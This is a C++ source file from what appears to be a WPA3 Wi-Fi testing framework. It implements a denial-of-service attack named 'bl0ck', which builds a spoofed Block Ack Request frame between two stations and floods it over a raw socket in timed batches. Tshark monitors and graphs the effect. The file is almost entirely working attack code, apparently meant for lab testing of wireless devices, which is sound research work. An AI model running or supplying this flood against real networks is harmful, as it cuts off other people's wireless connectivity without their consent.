#include <chrono>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "attacks/DoS_soft/bl0ck/test_monitor_bl0ck/test_sae_commit_monitor.h"
#include "config/RunStatus.h"

#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::test_monitor_bl0ck{
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

void speed_observation_start(RunStatus &rs){
	const HWAddress<6> rx_mac(rs.get_actor("receiver").get(SK::mac));
	const HWAddress<6> tx_mac(rs.get_actor("transceiver").get(SK::mac));

	const string mac_filter =
		"(wlan host " + rx_mac.to_string() + " or wlan host " + tx_mac.to_string() + ")"
		" or (wlan[0] & 0xfc == 0x84 or wlan[0] & 0xfc == 0x94)";

	observer::tshark::start_tshark(rs, "receiver", mac_filter);
	observer::tshark::start_tshark(rs, "transceiver", mac_filter);
}

void run_attack(RunStatus &rs){
	rs.start_observers();
	const auto &att_cfg    = rs.config().at("attack_config");
	const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
	const int ms_interval    = att_cfg.at("ms_interval").get<int>();
	const int duration_sec   = att_cfg.at("attack_time_sec").get<int>();

	const HWAddress<6> rx_mac(rs.get_actor("receiver").get(SK::mac));
	const HWAddress<6> tx_mac(rs.get_actor("transceiver").get(SK::mac));
	speed_observation_start(rs);

	auto [fd, addr] = bl0ck_attack::get_unblocking_socket(rs.get_actor("transceiver").get(SK::iface));
	this_thread::sleep_for(seconds(att_cfg.at("sleep_before_sec").get<int>()));
	RadioTap block_frame = bl0ck_attack::get_BAR_frame(rx_mac, tx_mac);
	const auto bytes = block_frame.serialize();
	const auto end_time = steady_clock::now() + seconds(duration_sec);
	while(steady_clock::now() < end_time) {
		for(int i = 0; i < frame_in_batch; ++i)
			sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
				   reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
		this_thread::sleep_for(milliseconds(ms_interval));
	}
	close(fd);
	this_thread::sleep_for(seconds(att_cfg.at("sleep_after_sec").get<int>()));
}

void stats_attack(const RunStatus &rs){
	observer::tshark::tshark_graph(rs, "receiver");
}
}